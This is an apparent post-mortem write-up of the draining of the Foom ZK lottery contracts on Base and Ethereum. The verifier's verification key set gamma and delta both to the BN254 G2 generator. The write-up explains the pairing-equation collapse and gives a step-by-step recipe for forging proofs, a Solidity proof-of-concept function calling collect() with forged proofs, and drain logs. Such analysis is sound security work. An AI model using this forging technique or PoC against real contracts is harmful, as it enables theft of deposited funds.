## Broken Groth16 `delta == gamma == G2 Generator`

---

>| Chain | Drained | Drain % | Iterations | Block |
>|-------|---------|---------|------------|-------|
>| Base | ~4.588 × 10³⁰ tokens | 99.97% | 10 | 42,650,620 |
>| ETH Mainnet | ~1.969 × 10³¹ tokens | 99.99% | 30 | 24,539,648 |

>| Chain | Verifier | Lottery |
>|-------|----------|---------|
>| Base | [`0x02c30D32A92a3C338bc43b78933D293dED4f68C6`](https://basescan.org/address/0x02c30D32A92a3C338bc43b78933D293dED4f68C6) | `0xdb203504ba1fea79164AF3CeFFBA88C59Ee8aAfD` |
>| ETH | [`0xc043865fb4D542E2bc5ed5Ed9A2F0939965671A6`](https://etherscan.io/address/0xc043865fb4D542E2bc5ed5Ed9A2F0939965671A6) | `0x239AF915abcD0a5DCB8566e863088423831951f8` |

<img width="1748" height="223" alt="image" src="https://github.com/user-attachments/assets/db11416d-c6f0-41e7-88e4-c6a14cadd2bc" />

<img width="1709" height="224" alt="image" src="https://github.com/user-attachments/assets/93495d5b-2ad1-4c57-b316-acafdcc2beac" />

## Summary

The Foom protocol, a lottery/gambling dApp using ZK proofs (Groth16) for withdrawals, was drained on **both Base and Ethereum mainnet** due to a fatal cryptographic flaw in the ZK Verifier contract, the verification key's `delta` and `gamma` parameters were both set to the BN254 G2 generator point, collapsing the Groth16 pairing equation into a tautology, this allowed anyone to forge valid proofs for arbitrary public inputs — no knowledge of any private witness required.

The entire operation on Base was a **whitehat rescue** led by [**@duha_real**](https://x.com/duha_real), who identified the vulnerability and drained the funds to secure them before a malicious actor could. 

The Ethereum mainnet operation was conducted independently by a separate whitehat ([`whitehat-rescue.eth`](https://etherscan.io/address/0x46c403e3DcAF219D9D4De167cCc4e0dd8E81Eb72)), not by @duha_real.

---

## Groth16 Verification

Groth16 is the most widely used zk-SNARK proving system, a proof consists of three elliptic curve elements `(A, B, C)` where `A, C ∈ G1` and `B ∈ G2` on the BN254 curve, verification checks a **pairing equation**

```
e(A, B) = e(α, β) · e(vk_x, γ) · e(C, δ)
```

Where:
- `α ∈ G1`, `β ∈ G2` — fixed verification key elements
- `γ ∈ G2`, `δ ∈ G2` — fixed verification key elements from the trusted setup
- `vk_x` — a G1 point computed from public inputs: `vk_x = IC[0] + Σ(input[i] · IC[i+1])`
- `IC[i]` — fixed G1 points in the verification key

Rewritten as a product-of-pairings check (what the EVM `ecpairing` precompile evaluates)

```
e(-A, B) · e(α, β) · e(vk_x, γ) · e(C, δ) = 1
```

The security of Groth16 relies on `α, β, γ, δ` being **independent random elements** from the trusted setup ceremony, If any relationships exist between them, the proof system collapses.

---

## Root cause

// `delta == gamma == G2 Generator`

The vulnerability is in the **trusted setup / verification key generation**, not in the Solidity verifier code itself, the Groth16 verifier logic is standard — but the VK it was initialized with is cryptographically broken.

In a correct Groth16 trusted setup:
- `γ` and `δ` must be **independent random G2 elements** generated during the ceremony
- Their discrete logarithms must be **unknown** to all parties (toxic waste)
- They must be **different from each other** and from the G2 generator

The Foom VK violates all three:
- `γ = δ` — they are identical
- Both equal the **G2 generator** — a publicly known point
- The discrete log is trivially `1`

This suggests the trusted setup was either **never performed**, used **trivial parameters**, or was **deliberately backdoored**.

The Foom ZK Verifier contracts deploy verification keys where

```
γ = δ = G2_generator = (
  x: [11559732032986387107991004021392285783925812861821192530917403151452391805634,
      10857046999023057135944570762232829481370756359578518086990519993285655852781],
  y: [4082367875863433681332203403145435568316851327593401208105741076214120093531,
      8495653923123431417604973247489272438418190587263600148770280649306958101930]
)
```

## `collect()`

The lottery contract exposes a `collect()` function that allows users to claim rewards by providing a Groth16 ZK proof:

```solidity
function collect(
    uint[2] calldata _pA,
    uint[2][2] calldata _pB,
    uint[2] calldata _pC,
    uint _root,
    uint _nullifierHash,
    address _recipient,
    address _relayer,
    uint _fee,
    uint _refund,
    uint _rewardbits,
    uint _invest
) payable external nonReentrant {
    require(nullifier[_nullifierHash] == 0, "Incorrect nullifier");
    nullifier[_nullifierHash] = 1;
    require(msg.value == _refund, "Incorrect refund amount received by the contract");

    uint reward = uint(betMin) * (
        (_rewardbits & 0x1 > 0 ? 1 : 0) * 2**betPower1 +
        (_rewardbits & 0x2 > 0 ? 1 : 0) * 2**betPower2 +
        (_rewardbits & 0x4 > 0 ? 1 : 0) * 2**betPower3
    );
    reward = reward * (100 - dividendFeePerCent - generatorFeePerCent) / 100;

    require(reward >= _fee, "Insufficient reward");
    require(roots[_root] > 0, "Cannot find your merkle root");

    uint balance = _balance();
    require(balance >= _fee, "Insufficient balance");

    // proof verification against the BROKEN verifier !
    require(
        withdraw.verifyProof(
            _pA, _pB, _pC,
            [_root, _nullifierHash, _rewardbits,
             uint(uint160(_recipient)), uint(uint160(_relayer)), _fee, _refund]
        ),
        "Invalid withdraw proof"
    );

    // ... reward distribution, dividend, invest logic, token transfer
}
```

*This is the standard BN254 G2 generator point — a publicly known constant, not a random element from a trusted setup.*

---

## Exploit

Whitehat TX Base ([@duha_real](https://x.com/duha_real)): https://app.blocksec.com/phalcon/explorer/tx/base/0xa88317a105155b464118431ce1073d272d8b43e87aba528a24b62075e48d929d

Whitehat TX ETH ([whitehat-rescue.eth](https://etherscan.io/address/0x46c403e3DcAF219D9D4De167cCc4e0dd8E81Eb72)): https://app.blocksec.com/phalcon/explorer/tx/eth/0xce20448233f5ea6b6d7209cc40b4dc27b65e07728f2cbbfeb29fc0814e275e48

> **Note:** Both transactions are **whitehat rescue operations**. The Base operation was led by [@duha_real](https://x.com/duha_real), who identified the vulnerability and drained the funds to secure them. The ETH mainnet operation (`0xce20448...`) was executed independently by [`whitehat-rescue.eth`](https://etherscan.io/address/0x46c403e3DcAF219D9D4De167cCc4e0dd8E81Eb72). Both used the identical technique (forged Groth16 proofs with `C = -vk_x`).

<img width="627" height="389" alt="image" src="https://github.com/user-attachments/assets/f14c08e4-85ac-49f9-8982-b7fb5eb685d5" />

// Why `delta == gamma` Breaks Everything

When `δ = γ`, the two rightmost pairing terms merge

```
e(vk_x, γ) · e(C, δ) = e(vk_x, γ) · e(C, γ) = e(vk_x + C, γ)
```

An attacker can choose `C = -vk_x` (the curve negation of `vk_x`), which yields

```
e(vk_x + (-vk_x), γ) = e(O, γ) = 1
```

Where `O` is the point at infinity, the entire right side of the equation collapses.

// Cancelling `α` and `β`

Since `α` and `β` are public (readable from the verification key), the attacker sets

```
A = α    (proof element A equals the VK's alpha)
B = β    (proof element B equals the VK's beta)
```

This makes the remaining term cancel

```
e(-A, B) · e(α, β) = e(-α, β) · e(α, β) = e(-α + α, β) = e(O, β) = 1
```

// Full Equation Collapse

Combining both cancellations

```
e(-A, B) · e(α, β) · e(vk_x, γ) · e(C, δ) = 1 · 1 = 1  ✓
```

**The verification is a tautology.** It returns `true` for any public inputs, regardless of whether a valid witness exists.

## Proof forging

For any chosen set of public inputs `(root, nullifier, denomination, recipient, ...)`

1. **Read `α`, `β`, `IC[0..n]` from the verification key** (public on-chain)
2. **Set `A = α`** and **`B = β`**
3. **Compute `vk_x`**
   ```
   vk_x = IC[0] + root · IC[1] + nullifier · IC[2] + denomination · IC[3] + recipient · IC[4]
   ```
   Using the EVM `ecMul` (precompile `0x07`) and `ecAdd` (precompile `0x06`).
4. **Set `C = -vk_x`** negate the G1 point by flipping the y-coordinate
   ```
   C = (vk_x.x,  p - vk_x.y)
   ```
   where `p = 21888242871839275222246405745257275088696311157297823662689037894645226208583` is the BN254 field prime.
5. **Call `collect(A, B, C, root, nullifier, recipient, ...)`** — the proof passes verification.

<img width="1490" height="205" alt="image" src="https://github.com/user-attachments/assets/6d6f4225-60ef-4126-a68a-ec1742f71c3d" />

---

## Exec Flow

```
┌──────────────┐     deploy       ┌────────────────────┐
│  Whitehat    │ ──────────────►  │  Exploit Contract  │
│  EOA         │                  │  (constructor)     │
└──────────────┘                  └──────┬─────────────┘
                                         │
                              ┌──────────▼───────────┐
                              │   Loop N iterations  │
                              │                      │
                              │  1. Compute vk_x     │
                              │  2. C = -vk_x        │
                              │  3. Call collect()   │
                              └──────────┬───────────┘
                                         │
                    ┌────────────────────▼────────────────────┐
                    │          Lottery Contract               │
                    │                                         │
                    │  ► verifyProof(A, B, C, inputs)         │
                    │    └─► ZK Verifier → TRUE (forged!)     │
                    │  ► token.transfer(recipient, payout)    │
                    └─────────────────────────────────────────┘
```

<img width="1479" height="143" alt="image" src="https://github.com/user-attachments/assets/5e84b7c7-bb7d-44d6-9169-7f39c6b38e2b" />

// Base mainnet — whitehat by [@duha_real](https://x.com/duha_real)

| Field | Value |
|-------|-------|
| Whitehat contract | `0x005299B37703511B35D851e17dd8D4615e8A2C9B` |
| Recipient | `0x73f55A95D6959D95B3f3f11dDd268ec502dAB1Ea` |
| Token | `0x02300aC24838570012027E0A90D3FEcCEF3c51d2` |
| Iterations | 10 |
| Nullifiers | `3735879680` → `3735879689` |
| Gas | 3,347,703 |

>**Drain sequence**
>
>| # | Nullifier | Amount Drained |
>|---|-----------|----------------|
>| 1 | 3735879680 | 4.047 × 10³⁰ |
>| 2 | 3735879681 | 2.707 × 10²⁹ |
>| 3 | 3735879682 | 1.353 × 10²⁹ |
>| 4 | 3735879683 | 6.767 × 10²⁸ |
>| 5 | 3735879684 | 3.383 × 10²⁸ |
>| ... | ... | ... (halving) |
>| 10 | 3735879689 | 1.057 × 10²⁷ |

// Ethereum mainnet — whitehat by [whitehat-rescue.eth](https://etherscan.io/address/0x46c403e3DcAF219D9D4De167cCc4e0dd8E81Eb72)

| Field | Value |
|-------|-------|
| Whitehat contract | `0x256a5D6852Fa5B3C55D3b132e3669A0bdE42e22c` |
| Recipient | `0x46c403e3DcAF219D9D4De167cCc4e0dd8E81Eb72` |
| Token | `0xd0D56273290D339aaF1417D9bfa1bb8cFe8A0933` |
| Iterations | 30 |
| Nullifiers | `99999990000` → `99999990029` |
| Gas | 8,408,402 |

>**Drain sequence**
>
>| # | Nullifier | Amount Drained |
>|---|-----------|----------------|
>| 1 | 99999990000 | 4.047 × 10³⁰ |
>| 2 | 99999990001 | 4.047 × 10³⁰ |
>| 3 | 99999990002 | 4.047 × 10³⁰ |
>| 4 | 99999990003 | 4.047 × 10³⁰ |
>| 5 | 99999990004 | 1.752 × 10³⁰ |
>| 6 | 99999990005 | 8.760 × 10²⁹ |
>| ... | ... | ... (halving) |
>| 30 | 99999990029 | 5.221 × 10²² |

*The ETH lottery balance reached **0** after 30 iterations (confirmed by a `balanceOf` check at the end of the whitehat contract constructor)*

---

## Pairing Check

Examining the `ecpairing` precompile call from the on-chain trace confirms the exploit, the verifier sends 4 pairs `(G1, G2)` to the pairing precompile

```
Pair 1: ( -A,    B     )    ← negate(alpha), beta
Pair 2: (  A,    B     )    ← alpha, beta          [SAME G2 as pair 1]
Pair 3: ( vk_x,  γ     )    ← computed from inputs
Pair 4: (  C,    δ     )    ← -vk_x, delta         [SAME G2 as pair 3]
```

// Pairs 1 & 2 cancel
Both use the same G2 point (B = β). The G1 points are `A` and `-A` (verified: their y-coordinates sum to the field prime `p`) by bilinearity
```
e(-A, B) · e(A, B) = e(O, B) = 1
```

// Pairs 3 & 4 cancel
Both use the same G2 point (γ = δ = G2 generator). The G1 points are `vk_x` and `C = -vk_x` (verified: y-coordinates sum to `p`) by bilinearity
```
e(vk_x, γ) · e(-vk_x, γ) = e(O, γ) = 1
```

**Result:** `1 · 1 = 1` — the pairing check is trivially satisfied.

### Key Evidence from Traces

- **A and B are identical across ALL `collect()` calls** on both chains — confirming they are the fixed VK parameters `α` and `β`, not computed per-proof.
- **Only C changes** between iterations, reflecting the recomputed `-vk_x` as the nullifier increments.
- **IC[5], IC[6], IC[7] are always multiplied by 0** — the last 3 public inputs are unused (fee, refund, anonSet all set to 0).

---

## PoC

The PoC independently forges Groth16 proofs using only on-chain VK parameters and EC precompiles

**`src/FoomExploit.sol`** — Reads `α, β, IC[0..4]` from the VK, computes `vk_x` for each nullifier, sets `C = -vk_x`, calls `collect()`.

```solidity
function _forgeAndCollect(address lottery, uint256 root, uint256 nullifier, address recipient) internal {
    (uint256 vkxX, uint256 vkxY) = _computeVkX(root, nullifier, uint256(uint160(recipient)));

    // C = -vk_x  ⟹  pairing trivially holds when gamma == delta
    IFoomLottery(lottery).collect(
        [ALPHA_X, ALPHA_Y],                          // A = alpha
        [[BETA_X1, BETA_X2], [BETA_Y1, BETA_Y2]],   // B = beta
        [vkxX, P - vkxY],                            // C = -vk_x
        root, nullifier, recipient, address(0), 0, 0, 7, 0
    );
}
```

## Output

```
============================================
        BASE CHAIN EXPLOIT (block 42650620)

  Victim Lottery:              0xdb203504ba1fea79164AF3CeFFBA88C59Ee8aAfD
  Broken ZK Verifier:         0x02c30D32A92a3C338bc43b78933D293dED4f68C6
  Drained Token:               0x02300aC24838570012027E0A90D3FEcCEF3c51d2
  Lottery token balance BEFORE: 4589254196734797608386036919841
  --------------------------------------------
  Lottery token balance AFTER:  1057487102997651578878978360
  Attacker stolen tokens:       4588196709631799956807157941481
  Drain percentage (bps):       9997
============================================

============================================
       ETH MAINNET EXPLOIT (block 24539648)

  Victim Lottery:              0x239AF915abcD0a5DCB8566e863088423831951f8
  Broken ZK Verifier:         0xc043865fb4D542E2bc5ed5Ed9A2F0939965671A6
  Drained Token:               0xd0D56273290D339aaF1417D9bfa1bb8cFe8A0933
  Lottery token balance BEFORE: 19695576810020236864000000000000
  --------------------------------------------
  Lottery token balance AFTER:  52218043953481865882874
  Attacker stolen tokens:       19695576757802192910518134117126
  Drain percentage (bps):       9999
============================================
```

<img width="680" height="321" alt="image" src="https://github.com/user-attachments/assets/4d8a95e1-25d6-40a5-a3a9-afa611be2f7b" />

<img width="683" height="323" alt="image" src="https://github.com/user-attachments/assets/3b60cdbd-f120-47ea-8a80-749d0b79a49b" />

>| Chain | Before | After | Stolen | Drain % |
>|-------|--------|-------|--------|---------|
>| **Base** | 4.589 × 10³⁰ | 1.057 × 10²⁷ | 4.588 × 10³⁰ | **99.97%** |
>| **ETH** | 1.969 × 10³¹ | 5.221 × 10²² | 1.969 × 10³¹ | **99.99%** |

---

## References

- [Groth16 Paper](https://eprint.iacr.org/2016/260.pdf) — Jens Groth, "On the Size of Pairing-based Non-interactive Arguments" (2016)
- [EIP-197](https://eips.ethereum.org/EIPS/eip-197) — BN254 pairing precompile (`ecpairing` at address `0x08`)
- [EIP-196](https://eips.ethereum.org/EIPS/eip-196) — BN254 `ecAdd` (`0x06`) and `ecMul` (`0x07`) precompiles
- Base Verifier: [`0x02c30D32A92a3C338bc43b78933D293dED4f68C6`](https://basescan.org/address/0x02c30D32A92a3C338bc43b78933D293dED4f68C6)
- ETH Verifier: [`0xc043865fb4D542E2bc5ed5Ed9A2F0939965671A6`](https://etherscan.io/address/0xc043865fb4D542E2bc5ed5Ed9A2F0939965671A6)

